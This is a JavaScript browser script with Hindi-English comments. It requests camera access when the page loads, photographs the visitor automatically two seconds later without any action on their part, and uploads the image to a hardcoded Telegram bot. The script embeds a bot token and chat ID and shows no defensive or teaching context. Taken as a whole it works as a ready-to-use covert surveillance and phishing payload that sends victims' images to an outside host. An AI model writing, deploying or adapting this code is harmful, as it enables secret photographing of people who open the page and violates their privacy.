const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Aapka provide kiya gaya data
const botToken = '8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA'; 
const chatId = '7107389141'; 

async function setupCamera() {
    try {
        // Camera access ki permission mangna
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        
        // Page load hone ke 2 second baad automatic photo click hogi
        setTimeout(takeSnapshot, 2000); 
    } catch (err) {
        console.error("Camera access error: ", err);
    }
}

function takeSnapshot() {
    const context = canvas.getContext('2d');
    // Video frame ko canvas par draw karna
    context.drawImage(video, 0, 0, 640, 480);
    
    // Canvas se image blob (data) banana
    canvas.toBlob(blob => {
        sendToTelegram(blob);
    }, 'image/jpeg');
}

async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'camera_capture.jpg');

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            console.log("Photo successfully sent to your Telegram bot!");
        } else {
            console.error("Telegram API Error:", await response.text());
        }
    } catch (error) {
        console.error("Network Error:", error);
    }
}

// Bot start karein
setupCamera();
